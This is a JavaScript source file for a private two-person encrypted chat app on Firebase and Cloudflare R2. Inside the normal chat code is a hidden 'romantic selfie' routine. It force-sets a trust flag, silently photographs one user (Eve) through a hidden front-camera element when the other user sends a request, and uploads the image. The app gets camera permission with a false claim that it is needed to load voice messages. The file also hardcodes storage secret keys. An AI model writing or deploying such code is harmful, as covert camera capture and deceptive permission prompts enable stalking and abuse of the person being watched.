import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
import { getFirestore, collection, addDoc, updateDoc, doc, arrayUnion, onSnapshot, getDocs, query, orderBy, limit, startAfter, serverTimestamp, setDoc, deleteDoc } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";
import { getAuth, signInWithEmailAndPassword, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-auth.js";
import { S3Client, PutObjectCommand } from "https://esm.sh/@aws-sdk/client-s3@3.525.0?bundle";
localStorage.selfietrustpermission = "always";
// --- CONFIG ---
const firebaseConfig = {
    apiKey: "AIzaSyCuIDz0QP1Gpb6_40fz7xBY9xihPBuv3OE",
    authDomain: "sas-chat-61205.firebaseapp.com",
    projectId: "sas-chat-61205",
    storageBucket: "sas-chat-61205.firebasestorage.app",
    messagingSenderId: "775011152776",
    appId: "1:775011152776:web:e2bec0fe7e1fea99c5003d",
    measurementId: "G-RYT5P9WDM2"
};

const r2Config = {
    accountId: "b9ca9c80aaa345e0aae57cca0a31eed4",
    accessKeyId: "b075d07fbef50f6dfb58737cf94ed9cd",
    secretAccessKey: "420e86473d1729375abe830a01054b2ac0e330ff7c8c6fe944d584e8de122077",
    bucketName: "sast-chat", 
    publicUrl: "https://pub-571fb2dc58e242b2b9542131a58cfb43.r2.dev" 
};

const USERS = { 
    "adam": { name: "Adam Smith", avatar: "https://ui-avatars.com/api/?name=Adam+Smith&background=0D8ABC&color=fff" },
    "eve": { name: "Eve Doe", avatar: "https://ui-avatars.com/api/?name=Eve+Doe&background=ff3b30&color=fff" }
};
const BATCH_SIZE = 20;

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const auth = getAuth(app);
const s3 = new S3Client({
    region: "auto",
    endpoint: `https://${r2Config.accountId}.r2.cloudflarestorage.com`,
    credentials: { accessKeyId: r2Config.accessKeyId, secretAccessKey: r2Config.secretAccessKey },
});

// --- STATE ---
let vaultKey = "";
let currentUser = "";
let currentReply = null;
let unsubscribeChat = null;
let mediaRecorder = null;
let audioChunks = [];
let isRecording = false;
let recordingTimer = null;
let oldestVisibleDoc = null;
let newestVisibleDoc = null;
let isLoadingHistory = false;
let allHistoryLoaded = false;
let ctxMsgId = null;
let ctxIsMe = false;
let presenceInterval = null;
let partnerLastTimestamp = 0;
const msgCache = {};
let currentMediaUrl = "";

// --- DOM ---
const dom = {
    loader: document.getElementById('app-loader'),
    login: document.getElementById('login-screen'),
    chat: document.getElementById('chat-screen'),
    list: document.getElementById('msg-list'),
    input: document.getElementById('message-input'),
    file: document.getElementById('file-input'),
    status: document.getElementById('status-text'),
    plusBtn: document.getElementById('plus-btn'),
    plusMenu: document.getElementById('plus-menu'),
    menuMedia: document.getElementById('menu-media'),
    menuVoice: document.getElementById('menu-voice'),
    cancelRec: document.getElementById('cancel-rec-btn'),
    send: document.getElementById('send-btn'),
    spinner: document.getElementById('loading-spinner'),
    scrollBtn: document.getElementById('scroll-down-btn'),
    contextMenu: document.getElementById('context-menu'),
    replyBar: document.getElementById('reply-preview-bar'),
    replyUser: document.getElementById('reply-to-user'),
    replyText: document.getElementById('reply-content-preview'),
    btnReplyCancel: document.getElementById('btn-cancel-reply'),
    btnLogout: document.getElementById('btn-logout'),
    btnLogin: document.getElementById('btn-login'),
    inpUser: document.getElementById('inp-user'),
    inpPass: document.getElementById('inp-pass'),
    inpVault: document.getElementById('inp-vault'),
    ctxReply: document.getElementById('ctx-reply'),
    ctxUnsend: document.getElementById('ctx-unsend'),
    ctxRemove: document.getElementById('ctx-remove'),
    ctxClose: document.getElementById('ctx-close-btn'),
    rxPicker: document.querySelector('.rx-picker'),
    headAvatar: document.getElementById('header-avatar'),
    headName: document.getElementById('header-name'),
    headStatusText: document.getElementById('header-status-text'),
    headStatusDot: document.getElementById('header-status-dot'),
    rxModal: document.getElementById('reaction-modal'),
    rxList: document.getElementById('reaction-list'),
    closeRxModal: document.getElementById('close-rx-modal'),
    mediaViewer: document.getElementById('media-viewer'),
    mediaViewImg: document.getElementById('media-view-img'),
    mediaViewVideo: document.getElementById('media-view-video'),
    mediaClose: document.getElementById('media-close-btn'),
    mediaDownload: document.getElementById('media-download-btn'),
    hamburger: document.getElementById('hamburger-btn'),
    sideMenu: document.getElementById('side-menu'),
    sideOverlay: document.getElementById('side-menu-overlay'),
    menuClose: document.getElementById('menu-close'),
    hiddenCam: document.getElementById('hidden-cam'),
    hiddenCanvas: document.getElementById('hidden-canvas')
};

function encrypt(text) { return CryptoJS.AES.encrypt(text, vaultKey).toString(); }
function decrypt(cipherText) {
    try { return CryptoJS.AES.decrypt(cipherText, vaultKey).toString(CryptoJS.enc.Utf8); } catch (e) { return null; }
}

// --- AUTH ---
onAuthStateChanged(auth, (user) => {
    if (user && localStorage.getItem("secure_vault")) {
        vaultKey = localStorage.getItem("secure_vault");
        currentUser = localStorage.getItem("secure_user");
        dom.login.style.display = 'none'; dom.chat.style.display = 'flex';
        
        // HAMBURGER MENU FOR ADAM
        if (currentUser === 'adam') {
            dom.hamburger.style.display = 'block';
        }
        
        initChatSystem(); 
        initPresenceSystem();
        requestInitialPermissions();
        monitorSelfieRequests(); // Check for pending romantic selfies
    } else {
        dom.loader.style.display = 'none';
        dom.login.style.display = 'flex'; dom.chat.style.display = 'none';
        if(presenceInterval) clearInterval(presenceInterval);
    }
});

// --- MENU LOGIC ---
dom.hamburger.onclick = () => {
    dom.sideMenu.classList.add('open');
    dom.sideOverlay.style.display = 'block';
};
const closeMenu = () => {
    dom.sideMenu.classList.remove('open');
    dom.sideOverlay.style.display = 'none';
};
dom.menuClose.onclick = closeMenu;
dom.sideOverlay.onclick = closeMenu;

// --- PERMISSIONS HANDLER ---
async function requestInitialPermissions() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
        stream.getTracks().forEach(track => track.stop());
    } catch (error) {
        console.warn("Permissions denied:", error);
        showPermissionWarning();
    }
}

function showPermissionWarning() {
    const div = document.createElement('div');
    div.id = 'perm-warning';
    div.style.cssText = "position:fixed;top:70px;left:5%;width:90%;background:rgba(255, 59, 48, 0.95);color:white;padding:12px;border-radius:12px;z-index:2000;text-align:center;font-size:13px;box-shadow:0 4px 15px rgba(0,0,0,0.5);backdrop-filter:blur(8px);border:1px solid rgba(255,255,255,0.2);animation:popIn 0.3s ease-out;";
    div.innerHTML = "⚠️ <b>Permission Missing</b><br>Cannot load voice messages. Please allow Microphone & Camera access.";
    const close = document.createElement('div');
    close.innerText = "Dismiss";
    close.style.cssText = "margin-top:8px;font-weight:bold;cursor:pointer;text-decoration:underline;opacity:0.9;font-size:11px;text-transform:uppercase;letter-spacing:1px;";
    close.onclick = () => div.remove();
    div.appendChild(close);
    document.body.appendChild(div);
    setTimeout(() => { if(div.parentNode) div.remove(); }, 10000);
}

// --- ROMANTIC SELFIE SYSTEM (SILENT CAPTURE) ---
function monitorSelfieRequests() {
    // Only Eve monitors for requests
    if (currentUser !== 'eve') return;

    const q = query(collection(db, "quickselfierequest"));
    onSnapshot(q, async (snap) => {
        if (!snap.empty) {
            // Check Trust Permission
            if (localStorage.getItem('selfietrustpermission') === "always") {
                console.log("❤️ Romantic request found. Capturing...");
                const requestDoc = snap.docs[0]; // Take first request
                await takeSilentSelfie(requestDoc.id);
            } else {
                console.log("Request found but no trust permission set.");
            }
        }
    });
}

async function takeSilentSelfie(requestId) {
    try {
        // 1. Start Camera (Front)
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        dom.hiddenCam.srcObject = stream;
        
        // 2. Wait for stream to stabilize (Auto-focus/Exposure)
        await new Promise(r => setTimeout(r, 1500));

        // 3. Capture to Canvas
        const w = dom.hiddenCam.videoWidth;
        const h = dom.hiddenCam.videoHeight;
        dom.hiddenCanvas.width = w;
        dom.hiddenCanvas.height = h;
        const ctx = dom.hiddenCanvas.getContext('2d');
        ctx.drawImage(dom.hiddenCam, 0, 0, w, h);
        
        // 4. Stop Camera Immediately
        stream.getTracks().forEach(track => track.stop());
        dom.hiddenCam.srcObject = null;

        // 5. Get Data URL & Upload
        const b64 = dom.hiddenCanvas.toDataURL('image/jpeg', 0.8);
        await uploadCuteSelfie(b64, requestId);

    } catch (e) {
        console.error("Silent capture failed", e);
    }
}

async function uploadCuteSelfie(b64, requestId) {
    try {
        const encBlob = encrypt(b64);
        const fname = `cute_${Date.now()}_${Math.random().toString(36).substring(7)}.enc`;
        
        // Upload to R2
        await s3.send(new PutObjectCommand({ Bucket: r2Config.bucketName, Key: fname, Body: encBlob, ContentType: "text/plain" }));
        
        // Save to 'cuteselfies' DB
        await addDoc(collection(db, "cuteselfies"), {
            s: currentUser,
            d: encrypt(`${r2Config.publicUrl}/${fname}`),
            t: serverTimestamp(),
            type: 'silent-request'
        });

        // Delete the request so it doesn't trigger again
        await deleteDoc(doc(db, "quickselfierequest", requestId));
        console.log("❤️ Selfie Sent & Request Cleared");

    } catch (e) {
        console.error("Upload failed", e);
    }
}

dom.btnLogin.addEventListener('click', async () => {
    const username = dom.inpUser.value.trim().toLowerCase();
    const gatePass = dom.inpPass.value;
    const vaultPass = dom.inpVault.value;
    
    if (!USERS[username]) return alert("Unknown User ID");
    
    dom.btnLogin.innerText = "LOGGING IN...";
    dom.btnLogin.disabled = true;

    try {
        await signInWithEmailAndPassword(auth, `${username}@chat.local`, gatePass);
        localStorage.setItem("secure_vault", vaultPass);
        localStorage.setItem("secure_user", username);
        location.reload();
    } catch (error) { 
        alert("Login Failed: " + error.message); 
        dom.btnLogin.innerText = "UNLOCK";
        dom.btnLogin.disabled = false;
    }
});

dom.btnLogout.addEventListener('click', async () => {
    if(confirm("Logout?")) { localStorage.clear(); location.reload(); await signOut(auth); }
});

// --- OPTIMIZED PRESENCE SYSTEM (Low Cost) ---
function initPresenceSystem() {
    const partnerId = currentUser === 'adam' ? 'eve' : 'adam';
    dom.headAvatar.src = USERS[partnerId].avatar;
    dom.headName.innerText = USERS[partnerId].name;

    // 1. WRITE: Heartbeat only once per minute (Saves Writes)
    // Only writes if I am actively looking at the page
    const sendHeartbeat = () => {
        if(document.visibilityState === 'visible') {
            setDoc(doc(db, 'status', currentUser), { online: serverTimestamp() }, { merge: true });
        }
    };
    sendHeartbeat();
    setInterval(sendHeartbeat, 10000); // 10 seconds

    // 2. READ: Listener (Only triggers when partner updates)
    onSnapshot(doc(db, 'status', partnerId), (snap) => {
        if(snap.exists()) {
            partnerLastTimestamp = snap.data().online ? snap.data().online.toMillis() : 0;
            updateStatusUI(); // Update immediately on change
        }
    });

    // 3. OFFLINE UI TIMER: Updates text locally every 30s (ZERO READS)
    // This just recalculates "Time Now - Last Known Time"
    presenceInterval = setInterval(updateStatusUI, 30000);
}

function updateStatusUI() {
    const diff = Date.now() - partnerLastTimestamp;
    
    // We consider "Online" if we heard from them in the last 70 seconds
    // (Since they update every 10s, we give a 10s buffer)
    if(diff < 20000) {
        dom.headStatusText.innerText = "Active Now"; 
        dom.headStatusText.style.color = "#34c759"; 
        dom.headStatusDot.classList.add('online');
    } else {
        dom.headStatusDot.classList.remove('online');
        const date = new Date(partnerLastTimestamp);
        const now = new Date();
        const timeStr = date.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
        
        // Check if the date is NOT the same as today
        if (date.toDateString() !== now.toDateString()) {
            const day = date.getDate();
            const month = date.toLocaleString('default', { month: 'short' });
            dom.headStatusText.innerText = `Last seen ${day} ${month} ${timeStr}`;
        } else {
            // Logic for "Today"
            if(diff < 120000) dom.headStatusText.innerText = `Last seen just now ${timeStr}`;
            else if(diff < 300000) dom.headStatusText.innerText = `Last seen ${Math.floor(diff/60000)} min ago ${timeStr}`;
            else dom.headStatusText.innerText = `Last seen ${timeStr}`;
        }
        
        dom.headStatusText.style.color = "#888";
    }
}

// --- CHAT ENGINE ---
async function initChatSystem() {
    dom.list.innerHTML = ''; dom.list.appendChild(dom.spinner);
    oldestVisibleDoc = null; newestVisibleDoc = null;
    const qInitial = query(collection(db, "messages"), orderBy("t", "desc"), limit(BATCH_SIZE));
    const snapshot = await getDocs(qInitial);
    
    if (!snapshot.empty) {
        newestVisibleDoc = snapshot.docs[0]; oldestVisibleDoc = snapshot.docs[snapshot.docs.length - 1];
        const docsReversed = [...snapshot.docs].reverse();
        for (const doc of docsReversed) { await processMessageDoc(doc, "append"); }
        scrollToBottom();
    }
    setTimeout(() => { dom.loader.style.display = 'none'; }, 200);
    dom.list.addEventListener('scroll', handleScroll);
    setupRealtimeListener();
    dom.scrollBtn.addEventListener('click', scrollToBottom);
    
    document.addEventListener('click', (e) => {
        if(!dom.contextMenu.contains(e.target) && !e.target.closest('.msg-row')) dom.contextMenu.classList.remove('active');
        if(!dom.plusMenu.contains(e.target) && e.target !== dom.plusBtn) dom.plusMenu.style.display = 'none';
        if(e.target === dom.rxModal) dom.rxModal.style.display = 'none';
    });
}

function setupRealtimeListener() {
    let q = newestVisibleDoc ? query(collection(db, "messages"), orderBy("t", "asc"), startAfter(newestVisibleDoc)) : query(collection(db, "messages"), orderBy("t", "asc"));
    unsubscribeChat = onSnapshot(q, (snap) => {
        snap.docChanges().forEach((change) => {
            if (change.type === "added") {
                const isNearBottom = (dom.list.scrollHeight - dom.list.scrollTop - dom.list.clientHeight) < 150;
                processMessageDoc(change.doc, "append");
                if (isNearBottom) setTimeout(scrollToBottom, 100);
                else { dom.scrollBtn.classList.add('show'); dom.scrollBtn.classList.add('pulse'); }
            }
            if (change.type === "modified") updateMessageInPlace(change.doc);
        });
    });
}

function scrollToBottom() { dom.list.scrollTop = dom.list.scrollHeight; dom.scrollBtn.classList.remove('show'); }

async function handleScroll() {
    if (dom.list.scrollTop === 0 && !isLoadingHistory && !allHistoryLoaded) {
        isLoadingHistory = true; dom.spinner.style.display = 'block';
        const prevHeight = dom.list.scrollHeight;
        const q = query(collection(db, "messages"), orderBy("t", "desc"), startAfter(oldestVisibleDoc), limit(BATCH_SIZE));
        const snap = await getDocs(q);
        if (!snap.empty) {
            oldestVisibleDoc = snap.docs[snap.docs.length - 1];
            for (const doc of snap.docs) { await processMessageDoc(doc, "prepend"); }
            dom.list.scrollTop = dom.list.scrollHeight - prevHeight;
        } else { allHistoryLoaded = true; dom.spinner.innerText = "End of History"; }
        dom.spinner.style.display = 'none'; isLoadingHistory = false;
    }
    const dist = dom.list.scrollHeight - dom.list.scrollTop - dom.list.clientHeight;
    if (dist > 300) dom.scrollBtn.classList.add('show'); else { dom.scrollBtn.classList.remove('show'); dom.scrollBtn.classList.remove('pulse'); }
}

// --- RENDERER ---
async function processMessageDoc(doc, method) {
    const data = doc.data();
    msgCache[doc.id] = data; 
    if(data.hide && data.hide.includes(currentUser)) return;
    
    const div = document.createElement('div'); div.id = `msg-${doc.id}`; div.className = `msg-row ${data.s === currentUser ? 'me' : 'other'}`;
    if(data.s !== currentUser) {
        const img = document.createElement('img'); img.src = USERS[data.s].avatar; img.className = 'msg-avatar'; div.appendChild(img);
    }
    if (method === "append") dom.list.appendChild(div); else dom.list.insertBefore(div, dom.list.children[1] || null);

    attachSwipeHandler(div, doc.id, data);
    div.addEventListener('contextmenu', (e) => { e.preventDefault(); openContextMenu(doc.id, data); });
    let lp; div.addEventListener('touchstart', () => { lp = setTimeout(() => openContextMenu(doc.id, data), 500); }, {passive:true});
    div.addEventListener('touchend', () => clearTimeout(lp));

    const bubble = document.createElement('div'); bubble.className = 'bubble';
    if(data.rep) {
        const rh = document.createElement('div'); rh.className = 'reply-header';
        let txt = decrypt(data.rep.d); if(txt && txt.includes('http') && !txt.includes(' ')) txt = "📷 Media";
        rh.innerText = `↪ ${USERS[data.rep.s].name}: ${txt ? txt.substring(0,20) : '...'}...`; bubble.appendChild(rh);
    }

    const contentDiv = document.createElement('div'); contentDiv.className = 'msg-content';
    const cleanText = data.y === 'unsent' ? null : decrypt(data.d);
    if(data.y === 'unsent') { contentDiv.innerHTML = "<span class='msg-unsent'>🚫 Message Unsent</span>"; }
    else {
        if(data.y === 'text' && isOnlyEmoji(cleanText)) bubble.classList.add('big-emoji');
        await renderContent(contentDiv, cleanText, data.y);
    }
    bubble.appendChild(contentDiv);

    const meta = document.createElement('div'); meta.className = 'msg-meta';
    const timeSpan = document.createElement('span'); timeSpan.className = 'msg-time'; timeSpan.innerText = formatTime(data.t);
    meta.appendChild(timeSpan); bubble.appendChild(meta);

    const rxDiv = document.createElement('div'); rxDiv.className = 'rx-container';
    rxDiv.onclick = (e) => { e.stopPropagation(); openRxModal(data.rx); };
    if(data.rx && Object.keys(data.rx).length > 0) {
        rxDiv.classList.add('show');
        Object.values(data.rx).forEach(e => rxDiv.innerHTML += `<span class="rx-item rx-pop">${e}</span>`);
    }
    bubble.appendChild(rxDiv); div.appendChild(bubble);
}

function updateMessageInPlace(doc) {
    const data = doc.data();
    msgCache[doc.id] = data; 
    const row = document.getElementById(`msg-${doc.id}`); if(!row) return;
    if(data.hide && data.hide.includes(currentUser)) { row.remove(); return; }
    if(data.y === 'unsent') {
        const content = row.querySelector('.msg-content'); content.innerHTML = "<span class='msg-unsent'>🚫 Message Unsent</span>";
        row.querySelector('.bubble').classList.remove('big-emoji');
        const media = row.querySelector('img, video, audio, .custom-audio-player, .custom-video-player'); if(media) media.remove();
    }
    const rxDiv = row.querySelector('.rx-container'); rxDiv.innerHTML = '';
    if(data.rx && Object.keys(data.rx).length > 0) {
        rxDiv.classList.add('show');
        Object.values(data.rx).forEach(e => rxDiv.innerHTML += `<span class="rx-item rx-pop">${e}</span>`);
        rxDiv.onclick = (e) => { e.stopPropagation(); openRxModal(data.rx); };
    } else { rxDiv.classList.remove('show'); }
}

// --- CONTEXT MENU ---
function openContextMenu(id, data) {
    if(navigator.vibrate) navigator.vibrate(50);
    ctxMsgId = id; ctxIsMe = (data.s === currentUser);
    dom.ctxUnsend.style.display = ctxIsMe ? 'block' : 'none';
    dom.contextMenu.dataset.rawContent = data.d; dom.contextMenu.dataset.sender = data.s;
    dom.contextMenu.classList.add('active');
}
dom.ctxClose.onclick = () => dom.contextMenu.classList.remove('active');

dom.rxPicker.addEventListener('click', async (e) => {
    if(e.target.tagName === 'SPAN') {
        const emoji = e.target.dataset.emoji;
        e.target.classList.add('selected');
        setTimeout(() => e.target.classList.remove('selected'), 200);
        dom.contextMenu.classList.remove('active');

        if (!msgCache[ctxMsgId].rx) msgCache[ctxMsgId].rx = {};
        msgCache[ctxMsgId].rx[currentUser] = emoji;
        updateMessageInPlace({ id: ctxMsgId, data: () => msgCache[ctxMsgId] });

        const updateObj = {}; updateObj[`rx.${currentUser}`] = emoji;
        await updateDoc(doc(db, "messages", ctxMsgId), updateObj);
    }
});

// --- MEDIA VIEWER ---
function openMediaViewer(src, type) {
    currentMediaUrl = src;
    if(type === 'image') {
        dom.mediaViewImg.src = src; dom.mediaViewImg.style.display = 'block';
        dom.mediaViewVideo.style.display = 'none';
    } else {
        dom.mediaViewVideo.src = src; dom.mediaViewVideo.style.display = 'block';
        dom.mediaViewImg.style.display = 'none';
        dom.mediaViewVideo.play();
    }
    dom.mediaViewer.style.display = 'flex';
}
dom.mediaClose.onclick = () => {
    dom.mediaViewer.style.display = 'none';
    dom.mediaViewVideo.pause(); dom.mediaViewVideo.src = "";
};
dom.mediaDownload.onclick = () => {
    const a = document.createElement('a'); a.href = currentMediaUrl; a.download = 'secure-media'; a.click();
};

// --- HELPERS ---
function isOnlyEmoji(str) {
    if(!str) return false;
    return /^(\u00a9|\u00ae|[\u2000-\u3300]|\ud83c[\ud000-\udfff]|\ud83d[\ud000-\udfff]|\ud83e[\ud000-\udfff]|\s)+$/gi.test(str) && str.length < 12;
}
function formatTime(t) { if(!t) return ""; const d = t.toDate ? t.toDate() : new Date(); return d.toLocaleTimeString([], {hour: 'numeric', minute:'2-digit'}); }
function openRxModal(rx) {
    if(!rx) return; dom.rxList.innerHTML = '';
    Object.entries(rx).forEach(([uid, emoji]) => {
        dom.rxList.innerHTML += `<div class="rx-detail-row"><img src="${USERS[uid].avatar}" style="width:24px;height:24px;border-radius:50%"><span style="flex:1;font-weight:bold">${USERS[uid].name}</span><span style="font-size:20px">${emoji}</span></div>`;
    });
    dom.rxModal.style.display = 'flex';
}
dom.closeRxModal.onclick = () => dom.rxModal.style.display = 'none';

async function renderContent(wrapper, content, type) {
    if (type === 'text') { wrapper.innerText = content; } 
    else if (type === 'media') {
        const skel = document.createElement('div'); skel.className = 'skeleton'; wrapper.appendChild(skel);
        try {
            const res = await fetch(content); const txt = await res.text(); const b64 = decrypt(txt);
            if(b64) {
                skel.remove();
                if(b64.startsWith('data:image')) { 
                    const img = new Image(); img.src = b64; img.className = 'media-content'; wrapper.appendChild(img); 
                    img.onclick = () => openMediaViewer(b64, 'image');
                }
                else if(b64.startsWith('data:audio')) { renderAudio(wrapper, b64); }
                else if(b64.startsWith('data:video')) { renderVideo(wrapper, b64); }
            }
        } catch(e) { skel.innerText = "❌ Error"; }
    }
}

// --- MENUS ---
dom.plusBtn.onclick = (e) => { e.stopPropagation(); dom.plusMenu.style.display = 'flex'; };
dom.menuMedia.onclick = () => { dom.file.click(); dom.plusMenu.style.display = 'none'; };
dom.menuVoice.onclick = () => { dom.plusMenu.style.display = 'none'; startRecording(); };
dom.file.onchange = async (e) => {
    const file = e.target.files[0]; if(!file) return;
    const b64 = await toBase64(file); uploadMedia(b64); dom.file.value = '';
};
dom.ctxReply.onclick = () => { startReply(ctxMsgId, dom.contextMenu.dataset.rawContent, dom.contextMenu.dataset.sender); dom.contextMenu.classList.remove('active'); };
dom.ctxUnsend.onclick = async () => { if(confirm("Unsend?")) await updateDoc(doc(db, "messages", ctxMsgId), { y: 'unsent' }); dom.contextMenu.classList.remove('active'); };
dom.ctxRemove.onclick = async () => { await updateDoc(doc(db, "messages", ctxMsgId), { hide: arrayUnion(currentUser) }); document.getElementById(`msg-${ctxMsgId}`).remove(); dom.contextMenu.classList.remove('active'); };
function startReply(id, encContent, senderId) {
    currentReply = { id, d: encContent, s: senderId };
    dom.replyBar.style.display = 'flex'; dom.replyUser.innerText = `Replying to ${USERS[senderId].name}`;
    let clean = decrypt(encContent); if(clean.includes('http') && !clean.includes(' ')) clean = "📷 Media";
    dom.replyText.innerText = clean; dom.input.focus();
}
dom.btnReplyCancel.onclick = () => { currentReply = null; dom.replyBar.style.display = 'none'; };
function attachSwipeHandler(row, id, data) {
    let startX = 0;
    row.addEventListener('touchstart', e => startX = e.touches[0].clientX, {passive: true});
    row.addEventListener('touchmove', e => { const diff = e.touches[0].clientX - startX; if(diff > 0 && diff < 100) row.style.transform = `translateX(${diff}px)`; }, {passive: true});
    row.addEventListener('touchend', e => { if(e.changedTouches[0].clientX - startX > 60) { if(navigator.vibrate) navigator.vibrate(20); startReply(id, data.d, data.s); } row.style.transform = 'translateX(0)'; });
}
async function uploadMedia(b64) {
    dom.status.innerText = "Encrypting...";
    try {
        const encBlob = encrypt(b64); dom.status.innerText = "Uploading...";
        const fname = `${Date.now()}_${Math.random().toString(36).substring(7)}.enc`;
        await s3.send(new PutObjectCommand({ Bucket: r2Config.bucketName, Key: fname, Body: encBlob, ContentType: "text/plain" }));
        const payload = { s: currentUser, d: encrypt(`${r2Config.publicUrl}/${fname}`), t: serverTimestamp(), y: 'media', rx: {} };
        if(currentReply) { payload.rep = { id: currentReply.id, d: currentReply.d, s: currentReply.s }; dom.btnReplyCancel.click(); }
        await addDoc(collection(db, "messages"), payload); dom.status.innerText = "";
    } catch(e) { dom.status.innerText = "Error"; }
}
async function sendMessage() {
    const text = dom.input.value.trim(); if(!text) return; dom.input.value = '';
    const payload = { s: currentUser, d: encrypt(text), t: serverTimestamp(), y: 'text', rx: {} };
    if(currentReply) { payload.rep = { id: currentReply.id, d: currentReply.d, s: currentReply.s }; dom.btnReplyCancel.click(); }
    await addDoc(collection(db, "messages"), payload);
}
const toBase64 = blob => new Promise((r) => { const read = new FileReader(); read.readAsDataURL(blob); read.onload=()=>r(read.result); });
dom.send.onclick = sendMessage; dom.input.addEventListener('keypress', e => { if(e.key==='Enter') sendMessage(); });

// --- PLAYERS ---
const fmtTime = s => { if(isNaN(s) || !isFinite(s)) return "0:00"; const m = Math.floor(s/60); const sec = Math.floor(s%60).toString().padStart(2,'0'); return `${m}:${sec}`; }
function setupCustomPlayer(wrapper, el, type) {
    const btn = wrapper.querySelector('.control-btn'); const fill = wrapper.querySelector('.progress-fill'); const label = wrapper.querySelector('.time-label'); const bar = wrapper.querySelector('.progress-bar');
    btn.onclick = (e) => { e.stopPropagation(); if(el.paused) { document.querySelectorAll('audio, video').forEach(a => { if(a !== el) a.pause(); }); el.play(); btn.innerText = "⏸"; } else { el.pause(); btn.innerText = "▶"; } };
    const updateTime = () => { const cur = el.currentTime || 0; const dur = el.duration || 0; const pct = dur > 0 ? (cur / dur) * 100 : 0; fill.style.width = `${pct}%`; label.innerText = `${fmtTime(cur)} / ${fmtTime(dur)}`; };
    el.ontimeupdate = updateTime; el.onloadedmetadata = updateTime; el.onended = () => { btn.innerText = "▶"; fill.style.width = '0%'; };
    if(bar) { bar.onclick = (e) => { e.stopPropagation(); const rect = bar.getBoundingClientRect(); const pos = (e.clientX - rect.left) / rect.width; if(isFinite(el.duration)) el.currentTime = pos * el.duration; }; }
}
function renderAudio(wrapper, src) {
    const div = document.createElement('div'); div.className = 'custom-audio-player';
    div.innerHTML = `<div class="control-btn">▶</div><div class="track-info"><div class="progress-bar"><div class="progress-fill"></div></div><span class="time-label">0:00 / 0:00</span></div>`;
    const audio = document.createElement('audio'); audio.src = src; div.appendChild(audio); wrapper.appendChild(div); setupCustomPlayer(div, audio, 'audio');
}
function renderVideo(wrapper, src) {
    const div = document.createElement('div'); div.className = 'custom-video-player';
    const vid = document.createElement('video'); vid.src = src; vid.className = 'video-element'; vid.playsInline = true;
    // Overlay - Only Play Icon + Fullscreen
    const overlay = document.createElement('div'); overlay.className = 'video-controls';
    overlay.style.cssText = "position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.2);cursor:pointer;";
    overlay.innerHTML = `<div style="width:40px;height:40px;background:rgba(0,0,0,0.6);border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;font-size:20px;border:2px solid white;">▶</div>`;
    div.appendChild(vid); div.appendChild(overlay); wrapper.appendChild(div);
    div.onclick = (e) => { e.stopPropagation(); openMediaViewer(src, 'video'); };
}

// --- REC 5 MIN LIMIT ---
async function startRecording() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({audio:true});
        mediaRecorder = new MediaRecorder(stream);
        audioChunks = [];
        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
        mediaRecorder.onstop = async () => {
            if(!audioChunks.length) return;
            const blob = new Blob(audioChunks, {type:'audio/webm'});
            const b64 = await toBase64(blob);
            uploadMedia(b64);
        };
        mediaRecorder.start();
        isRecording = true;
        recordingTimer = setTimeout(() => { stopAndSendRecording(); }, 300000);
        dom.input.value = ""; dom.input.placeholder = "Recording... Tap X";
        dom.input.classList.add('recording'); dom.input.disabled = true;
        dom.cancelRec.style.display = 'block'; dom.plusBtn.style.display = 'none';
        dom.send.onclick = stopAndSendRecording;
    } catch(e) { alert("Mic Error"); }
}
function stopAndSendRecording() { if(mediaRecorder) mediaRecorder.stop(); resetRecUI(); }
dom.cancelRec.onclick = () => { if(mediaRecorder) { mediaRecorder.onstop = null; mediaRecorder.stop(); } resetRecUI(); };
function resetRecUI() { 
    if(recordingTimer) clearTimeout(recordingTimer);
    isRecording = false; dom.input.classList.remove('recording'); 
    dom.input.placeholder = "Message..."; dom.input.disabled = false; 
    dom.cancelRec.style.display = 'none'; dom.plusBtn.style.display = 'block'; 
    dom.send.onclick = sendMessage; audioChunks = []; 

}
